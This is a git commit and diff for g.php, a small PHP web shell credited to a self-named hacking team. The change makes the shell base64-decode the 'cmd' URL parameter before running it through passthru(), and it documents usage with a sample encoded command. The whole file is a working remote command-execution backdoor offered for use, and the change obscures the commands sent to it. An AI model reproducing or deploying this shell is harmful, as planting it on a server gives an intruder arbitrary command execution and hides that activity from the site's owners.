1d3a18223e2cb6dbc75f5eb231b421f28113d454
xwh1t3r0s3 <xwh1t3r0s3@users.noreply.github.com>
2016-10-24 01:02:38 +0900

    g.php got improved so you can use it using curl command :)

--- g.php
+++ g.php
@@ -1,13 +1,16 @@
 	This is a simple php shell coded by Wh1t3R0s3 of Generation-X Security Team,<br>
 <br>
-	to use it just add ?cmd=[command] at the end of the link.<br>
+	to use it just add ?cmd=[command that it is in base64 encryption] at the end of the link.<br>
 
 	Example:<br>
-	https://example.com/g.php?cmd=ls <br>
+	https://example.com/g.php?cmd=bHMK<br>
+
+	Note:
+	The Command is strictly should be in base64 encryption to work :)
 
 	&copy; Wh1t3R0s3<br><br>
-------------------------------------------------------------------------------------------------------------------------------
+-------------------------------------------------------------------------------------------------------------------------------
 <br>
 <?php
-echo passthru($_GET['cmd']); _halt_compiler();
+echo passthru(base64_decode($_GET['cmd'])); _halt_compiler();
 ?>
